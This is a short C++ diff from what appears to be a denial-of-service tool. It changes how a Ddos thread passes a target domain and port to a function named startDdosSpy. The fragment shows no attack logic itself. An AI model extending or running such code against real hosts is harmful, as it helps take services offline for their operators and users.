@@ -105,9 +105,10 @@ DWORD Ddos::threadProc(LPVOID args)
 {
 	char domain[MAX_PATH];
 	memcpy(domain, args, MAX_PATH);
+	
 	int port = *((int*)((char*)args + MAX_PATH));
 
-	startDdosSpy(domain, port);
+	startDdosSpy(std::string(domain), port);
 
 	delete (char*)args;
 	return true;
